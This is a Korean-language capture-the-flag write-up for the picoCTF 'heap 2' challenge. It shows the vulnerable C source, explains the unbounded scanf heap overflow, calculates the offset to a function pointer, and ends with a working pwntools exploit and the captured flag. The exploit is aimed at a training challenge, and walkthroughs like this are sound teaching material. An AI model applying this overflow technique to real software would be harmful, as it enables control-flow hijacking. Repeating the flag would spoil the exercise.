# [heap 2](https://play.picoctf.org/practice/challenge/435?category=6&originalEvent=73&page=1)
<br />

**Description:**
> Can you handle function pointers?
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
<br />

**Binary Protections:**
```yaml
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5184d264ae0c1259ba3bb7a1e20fc348b4274b0, for GNU/Linux 3.2.0, with debug_info, not stripped

[*] '/home/kali/pico/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```
<br />
<br />

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```
`write_buffer()`에서 사용된 `scanf()`는 입력을 받아, `input_data`에 저장합니다. 여기서 사용된 포맷 스트링은 입력 받을 길이를 지정하지 않았으므로, 버퍼오버플로우가 발생합니다.

```c
void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}
```
그리고 사용된 소스코드를 보면 `input_data`, `x`를 `malloc()`으로 메모리 할당을 하고, 각 영역에 문자열 `pico`, `bico`를 저장하는 것을 알 수 있습니다. 이 정보로 `input_data`에서는 힙 버퍼오버플로우가 발생합니다.

그렇다면 문제를 풀이하기 위해서는 해당 취약점으로 `x`의 값을 `win()`의 주소로 덮고, `check_win()` 함수를 호출해야 합니다. `x`의 값을 조작하기 위해서 힙 영역의 오프셋을 계산하겠습니다.

<br />

```yaml
$ ./chall

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value
+-------------+-----------+
[*]   0x433f6b0  ->   pico
+-------------+-----------+
[*]   0x433f6d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 3


x = bico
```

문제에서 제공되는 주소 `0x433f6b0`, `0x433f6d0`는 각각 문자열 `pico`, `bico`를 가리키고 있으며, 소스코드 분석을 통해 각 주소는 `input_data`, `x`임을 알 수 있습니다. 두 주소를 빼면 포인터 간의 오프셋을 계산할 수 있습니다.

> [!NOTE]
> `0x433f6d0 - 0x433f6b0 = 0x20`


오프셋은 `0x20`입니다. 오프셋에 `win()`의 주소를 더해 입력하고, check_win을 호출하면 FLAG를 획득할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"

p = remote("mimas.picoctf.net", 53269)
e = ELF("./chall", checksec=False)

send = lambda data: p.sendlineafter(b": ", data)

send(b"2")
send(b"A"*0x20 + p64(e.sym["win"]))
send(b"4")

p.interactive()
```
```bash
$ python3 test.py
picoCTF{and_down_the_road_we_go_7c8d6f32}
$
```
